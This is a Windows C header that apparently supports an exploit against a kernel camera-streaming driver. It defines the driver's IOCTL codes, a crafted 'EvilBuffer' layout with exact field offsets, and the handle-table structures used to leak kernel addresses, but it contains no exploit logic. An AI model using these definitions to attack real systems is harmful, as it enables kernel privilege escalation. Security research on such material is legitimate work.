#pragma once
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <stdint.h>

#define IOCTL_IniContextRendezv 0x2F0400
#define IOCTL_ZwUpdateWnfStateData 0x2F0428
#define IOCTL_RegisterContext 0x2F041C
#define IOCTL_FSUpdateCamerStreamingConsent 0x2F042C
#define IOCTL_KSPropertyHandle 0x2F0003
#define IOCTL_InitializeStream 0x2F0404
#define IOCTL_RegisterStream 0x2F0420
#define IOCTL_PublishTx 0x2F0408
#define IOCTL_ConsumeTx 0x2F0410

#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)11
#define SystemHandleInformation (SYSTEM_INFORMATION_CLASS)16
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

#pragma pack(push, 1)
typedef struct _EvilBuffer {
    uint64_t size; // Size of the structure 0x1C0
    uint64_t txsize; // 8 bytes
    uint64_t rxsize; // 8 bytes
    uint32_t txcount; // 4 bytes
    uint32_t rxcount; // 4 bytes
    uint64_t value;         // 0x00000001`00000003
    uint64_t value2;        // 0x00000000`00000001
    uint64_t virtualAddress1; // 0x00000129`b5353ac0, offset 0x30
    uint64_t timestamp; // 0x0000002a`b012a64b, offset 0x38
    uint64_t field9; // Offset 0x40
    uint64_t virtualAddress2; // 0x00000129`b6010000, offset 0x48
    uint64_t field10; // Offset 0x50
    uint64_t size1; // 0x002f8000, offset 0x58
    uint64_t virtualAddress3; // 0x00000129`b5390f60, offset 0x60
    uint64_t size2; // 0x00001000, offset 0x68
    uint64_t flags; // 0x10000000`00000004, offset 0x70
    uint64_t resolution; // 0x00000000`00000780, offset 0x78
    uint64_t field11; // Offset 0x80
    uint64_t field12; // Offset 0x88
    uint64_t format; // 0x3231564E`3231564E (NV12 format in ASCII), offset 0x90
    uint64_t field13; // Offset 0x98
    uint64_t dimension; // 0x00000780`719b3800, offset 0xA0
    uint64_t field14; // Offset 0xA8
    uint8_t reserved2[0x110]; // Reserved bytes, offset 0xB0 to 0x1C0
} EvilBuffer;

typedef struct _ConsumeTxOut {
    uint64_t size;
    uint64_t txsize; // 8 bytes
    uint64_t rxsize; // 8 bytes
    uint32_t txcount; // 4 bytes
    uint32_t rxcount; // 4 bytes
    uint64_t value;         // 0x00000000`00000006
    uint64_t counter;
    uint64_t empty1;
    uint64_t empty2;
    uint64_t empty3;
    uint64_t empty4;
    uint64_t empty5;
    uint64_t empty6;
    uint8_t *MdlVaAddress;
    uint8_t reserved2[0xF68];
} ConsumeTxOut;
#pragma pack(pop)

typedef struct _MY_IRP
{
    uint64_t Type; // 8 bytes
    PVOID CurrentProcId; // 8 bytes
    uint64_t Flags; // 8 bytes
    HANDLE hEvent; // 8 bytes
} MY_IRP;

typedef struct _PublishTxOut
{
    uint64_t txsize; // 8 bytes
    uint64_t rxsize; // 8 bytes
    uint32_t txcount; // 4 bytes
    uint32_t rxcount; // 4 bytes
} PublishTxOut;

typedef struct _InputBuffer
{
    uint64_t Type;
    PVOID CurrentProcId;
    uint64_t Flags;
    uint64_t qword18;
    uint64_t qword20;
    HANDLE hEvent;
} InputBuffer;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    unsigned short UniqueProcessId;
    unsigned short CreatorBackTraceIndex;
    unsigned char ObjectTypeIndex;
    unsigned char HandleAttributes;
    unsigned short HandleValue;
    void* Object;
    unsigned long GrantedAccess;
    long __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    unsigned long NumberOfHandles;
    struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;